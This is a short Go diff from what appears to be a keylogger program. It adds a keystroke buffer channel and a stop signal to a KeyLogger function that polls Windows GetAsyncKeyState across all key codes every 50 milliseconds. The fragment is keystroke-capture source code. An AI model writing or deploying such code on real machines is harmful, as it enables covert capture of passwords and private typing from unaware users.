@@ -7,6 +7,7 @@ import (
 
 var (
 	procGetAsyncKeyState = syscall.NewLazyDLL("user32.dll").NewProc("GetAsyncKeyState")
+	CK                   = make(chan KeyBoard, 10000)
 )
 
 type KeyBoard struct {
@@ -14,8 +15,17 @@ type KeyBoard struct {
 	DateTime time.Time
 }
 
-func KeyLogger(ch chan string) {
+func KeyLogger(ch chan string, _ch *chan bool) {
+	var Continue = false
 	for {
+		select {
+		case Continue, _ = <-*_ch:
+		default:
+			Continue = true
+		}
+		if !Continue {
+			return
+		}
 		time.Sleep(50 * time.Millisecond)
 		for i := 0; i < 0xFF; i++ {
 			async, _, _ := procGetAsyncKeyState.Call(uintptr(i))
